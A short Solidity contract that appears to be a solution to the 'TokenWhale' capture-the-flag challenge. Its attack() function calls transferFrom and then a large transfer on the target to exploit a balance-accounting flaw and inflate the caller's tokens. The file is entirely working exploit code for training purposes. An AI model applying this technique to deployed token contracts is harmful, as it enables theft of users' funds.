pragma solidity 0.4.21;

import "../challenge/TokenWhaleChallenge.sol";
contract TokenWhaleChallengeAttacker {
    function attack(address target) external {
        TokenWhaleChallenge(target).transferFrom(msg.sender, msg.sender, 1000);
        TokenWhaleChallenge(target).transfer(msg.sender, 10000000);
    }
}